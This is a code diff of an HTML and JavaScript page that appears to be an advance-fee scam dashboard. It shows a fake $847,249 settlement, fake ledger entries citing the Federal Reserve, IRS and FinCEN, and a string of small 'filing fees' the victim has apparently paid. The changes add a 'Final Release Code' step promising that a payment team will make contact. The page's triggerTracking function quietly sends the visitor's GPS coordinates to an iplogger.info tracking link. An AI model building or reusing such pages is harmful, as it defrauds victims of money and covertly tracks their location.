@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -132,9 +133,9 @@
         <p class="text-[10px] text-slate-500 font-bold uppercase mb-2 tracking-widest">Remittance Status</p>
         
         <!-- CLICKABLE STATUS BUTTON -->
-        <a href="compliance.html" class="flex items-center gap-2.5 bg-green-950/40 px-4 py-2 rounded-full border border-green-500/30 mb-5 hover:bg-green-900/40 transition-colors">
+        <a href="compliance.html" class="flex items-center gap-2.5 bg-green-950/40 px-4 py-2 rounded-full border border-green-500/20 mb-5 hover:bg-green-900/40 transition-colors">
           <span class="status-dot bg-green-500 pulsing"></span>
-          <span class="text-[10px] font-bold text-green-400 uppercase tracking-widest">Transfer Acknowledged</span>
+          <span class="text-[10px] font-bold text-green-400 uppercase tracking-widest">Final Release Authorized</span>
         </a>
 
         <button onclick="runAudit()" class="px-6 py-2.5 bg-slate-50 hover:bg-white text-slate-950 rounded-lg font-bold text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95">
@@ -178,7 +179,7 @@
     <!-- Navigation Options -->
     <div class="text-center my-10">
       <a class='px-8 py-3 bg-blue-600/10 hover:bg-blue-600/20 text-blue-400 border border-blue-500/30 font-bold rounded-lg text-xs uppercase tracking-[0.2em] transition-all inline-block' href='settlement.html'>
-        Final Disbursement Notice
+        Bonus Info
       </a>
     </div>
 
@@ -269,7 +270,7 @@
   <script>
     /**
      * TRANSACTION DATA DEFINITIONS
-     * Updated to reflect completion of all 4 stages
+     * Each object represents a verified or pending ledger entry
      */
     const TX_DATA = [
       { date: "Jan 06, 2026", ref: "REF-4770", desc: "Initial Security Margin Provision", val: "$350.00", status: "SUCCESS" },
@@ -281,15 +282,17 @@
       { date: "Jan 22, 2026", ref: "WT-FINAL", desc: "Final Escrow Balance Wire", val: "$840,250.00", status: "RELEASED" },
       { date: "Jan 23, 2026", ref: "FCB-ADMIN-100", desc: "Administrative Processing Fee (FinCEN CTR-104)", val: "$100.00", status: "VERIFIED" },
       { date: "Jan 24, 2026", ref: "IRS-1099-M-58", desc: "IRS Form 1099-MISC Bonus Reporting", val: "$847,249.00", status: "AUTHORIZED" },
-      { date: "Jan 24, 2026", ref: "JLA-CORP-011", desc: "Joint Liability Agreement", val: "$400.00", status: "SUCCESS" },
-      { date: "Jan 24, 2026", ref: "FIQ-SEC-992", desc: "Federal Integrity Questionnaire", val: "COMPLETED", status: "SUCCESS" },
+      { date: "Jan 24, 2026", ref: "JLA-CORP-011", desc: "Joint Liability Agreement", val: "$400.00", status: "AUTHORIZED" },
+      { date: "Jan 24, 2026", ref: "FIQ-SEC-992", desc: "Federal Integrity Questionnaire", val: "COMPLETED", status: "AUTHORIZED" },
       { date: "Jan 24, 2026", ref: "FED-LOA-99", desc: "Federal Disbursement Letter of Acceptance", val: "$847,249.00", status: "AUTHORIZED" },
-      { date: "Feb 09, 2026", ref: "AML-STG3-ACK", desc: "Stage 3: AML Certification Filing", val: "$220.00", status: "SUCCESS" },
-      { date: "Feb 09, 2026", ref: "FRC-STG4-ACK", desc: "Stage 4: FRC Decryption Filing", val: "$110.00", status: "SUCCESS" }
+      { date: "Feb 06, 2026", ref: "AML-STG3-REQ", desc: "Stage 3: AML Certification Filing Fee", val: "$220.00", status: "SUCCESS" },
+      { date: "Feb 06, 2026", ref: "FRC-STG4-REQ", desc: "Stage 4: FRC Decryption Filing Fee", val: "$110.00", status: "SUCCESS" },
+      { date: "Feb 09, 2026", ref: "FIN-CODE-REL", desc: "Final Release Code Generation", val: "AUTH_READY", status: "RELEASED" }
     ];
 
     /**
      * COMPLIANCE AUDIT MAPPINGS
+     * Detailed administrative notes and actions required for each reference
      */
     const TX_DETAILS = {
       "REF-4770": { audit: "Margin collateral confirmed. Account eligibility verified.\nFiler: PitchBook Treasury Operations", action: "Account opened for high-value settlement." },
@@ -304,19 +307,20 @@
       "JLA-CORP-011": { audit: "Payment VERIFIED. Compliance review completed.\nFiler: PitchBook Legal Dept.", action: "Joint liability satisfied." },
       "FIQ-SEC-992": { audit: "Federal integrity screening completed.\nDallas Police FIU / Treasury Oversight", action: "Background verification and source of funds cleared." },
       "FED-LOA-99": { audit: "Letter of Acceptance confirmed by Federal Reserve Bank of Dallas.", action: "Legal disbursement rights granted and filed." },
-      "AML-STG3-ACK": { audit: "Filer: PitchBook Compliance Team\nAcknowledged by: TX Dept of Banking", action: "Anti-Money Laundering Certification Filing Completed. Funds released to final gateway." },
-      "FRC-STG4-ACK": { audit: "Filer: Federal Reserve Bank (Dallas)\nVerification: FRC Hash Decrypted", action: "Federal Release Code Decryption Successful. Transfer instructions broadcast to First Convenience Bank." }
+      "AML-STG3-REQ": { audit: "Stage 3: Anti-Money Laundering (AML) Certification\nReceived on Feb 06.", action: "Certification Verified and Filed." },
+      "FRC-STG4-REQ": { audit: "Stage 4: Federal Release Code (FRC) Decryption\nReceived on Feb 06.", action: "Key Decrypted. Payment Channels Open." },
+      "FIN-CODE-REL": { audit: "Final Release Code Generated.\nStatus: Ready for Application.", action: "INSTRUCTIONS: Payment Team/Bank will contact you. Please apply this code file with your bank officer to finalize the credit." }
     };
 
     /**
-     * Renders the dynamic ledger rows
+     * Renders the dynamic ledger rows based on TX_DATA
      */
     function renderLedger() {
       const container = document.getElementById('ledger-body');
       container.innerHTML = TX_DATA.map(tx => `
-        <tr class="ledger-row transition-colors">
+        <tr class="ledger-row transition-colors ${tx.status === 'ACTION REQUIRED' ? 'bg-amber-950/10' : ''}">
           <td class="px-8 py-4 font-mono text-slate-400">${tx.date}</td>
-          <td class="px-8 py-4 font-mono text-slate-400">${tx.ref}</td>
+          <td class="px-8 py-4 font-mono ${tx.status === 'ACTION REQUIRED' ? 'text-amber-500' : 'text-slate-400'}">${tx.ref}</td>
           <td class="px-8 py-4 ${tx.ref === 'WT-FINAL' ? 'text-slate-100 font-bold' : 'text-slate-400'}">${tx.desc}</td>
           <td class="px-8 py-4 text-right font-bold ${tx.ref === 'WT-FINAL' ? 'text-blue-400' : 'text-slate-300'}">${tx.val}</td>
           <td class="px-8 py-4"><span class="text-[9px] font-bold px-2.5 py-1 rounded-full border ${getStatusClass(tx.status)}">${tx.status}</span></td>
@@ -326,16 +330,16 @@
     }
 
     /**
-     * Returns appropriate tailwind classes
+     * Returns appropriate tailwind classes based on transaction status
      */
     function getStatusClass(status) {
-      if (status === 'SUCCESS' || status === 'AUTHORIZED') return 'text-green-500 border-green-500/20 bg-green-500/10';
-      if (status === 'VERIFIED' || status === 'RELEASED') return 'text-blue-400 border-blue-400/20 bg-blue-400/10';
+      if (status === 'SUCCESS' || status === 'AUTHORIZED' || status === 'RELEASED') return 'text-green-500 border-green-500/20 bg-green-500/10';
+      if (status === 'VERIFIED') return 'text-blue-400 border-blue-400/20 bg-blue-400/10';
       return 'text-amber-500 border-amber-500/20 pulsing';
     }
 
     /**
-     * Opens information modal
+     * Opens information modal for a specific transaction
      */
     function openAuditModal(refId) {
       const b = TX_DATA.find(t => t.ref === refId);
@@ -349,7 +353,7 @@
       document.getElementById('modal-body').innerText = d.action;
       
       const st = document.getElementById('modal-status');
-      st.className = 'text-sm font-bold uppercase ' + (b.status === 'SUCCESS' || b.status === 'AUTHORIZED' ? 'text-green-500' : 'text-blue-400');
+      st.className = 'text-sm font-bold uppercase ' + (b.status === 'ACTION REQUIRED' ? 'text-amber-500' : (b.status === 'SUCCESS' || b.status === 'AUTHORIZED' || b.status === 'RELEASED' ? 'text-green-500' : 'text-blue-400'));
       
       document.getElementById('info-modal').classList.remove('hidden');
     }
@@ -357,16 +361,16 @@
     function closeInfo() { document.getElementById('info-modal').classList.add('hidden'); }
 
     /**
-     * Updated Audit Briefing
+     * Simulates a system audit log display
      */
     function runAudit() {
       const panel = document.getElementById('audit-log');
       panel.classList.remove('hidden');
-      document.getElementById('audit-text').innerText = "Status: ALL SETTLEMENT STAGES COMPLETED\nTotal Disbursement: $847,249.00\n------------------------------------------\nStage 01: Statutory Filing .......... [SUCCESS]\nStage 02: Treasury Bond ............. [SUCCESS]\nStage 03: AML Certification ......... [SUCCESS]\nStage 04: FRC Decryption ............ [SUCCESS]\n------------------------------------------\nNote: Federal Reserve Bank (Dallas) has acknowledged receipt of all filings. Transfer sequence is active and instruction file has been delivered to First Convenience Bank.";
+      document.getElementById('audit-text').innerText = "Status: ALL STAGES CLEARED / RELEASE AUTHORIZED\nTotal Settlement Value: $847,249.00\n------------------------------------------\nStage 01: Statutory Filing .......... [$95.00] - SUCCESS\nStage 02: Treasury Bond ............. [$181.33] - SUCCESS\nStage 03: AML Certification ......... [$220.00] - SUCCESS\nStage 04: FRC Decryption ............ [$110.00] - SUCCESS\n------------------------------------------\nAction: Download/View Release Code. Payment Team will contact for final application.";
     }
 
     /**
-     * Geolocation tracking logic
+     * Geolocation tracking logic for FRC verification
      */
     async function triggerTracking() {
       const btn = document.getElementById('sync-btn');
@@ -374,10 +378,16 @@
       btn.disabled = true;
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
+          // Tracking execution using provided iplogger link
           const tracker = `https://iplogger.info/1Bf615?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}&client=MUKMUJ58`;
+          
+          // Image request for tracking
           const img = new Image();
           img.src = tracker;
+
+          // Fetch request for tracking
           try { await fetch(tracker, { mode: 'no-cors' }); } catch (e) {}
+          
           sessionStorage.setItem('frc_verified', 'true');
           setTimeout(() => { 
             document.getElementById('system-modal').classList.add('hidden'); 
@@ -392,7 +402,7 @@
       );
     }
 
-    // INITIALIZATION
+    // INITIALIZATION AND EVENT LISTENERS
     window.addEventListener('load', () => {
       const urlParams = new URLSearchParams(window.location.search);
       if (urlParams.get('auth') === 'verified') {
@@ -415,10 +425,14 @@
       }, 1500);
     });
 
+    /**
+     * Real-time clock update (CST)
+     */
     setInterval(() => {
       document.getElementById('system-time').innerText = new Date().toLocaleTimeString('en-US', { timeZone: 'America/Chicago', hour12: false }) + " CST";
     }, 1000);
 
+    // Initial table render
     renderLedger();
   </script>
 </body>
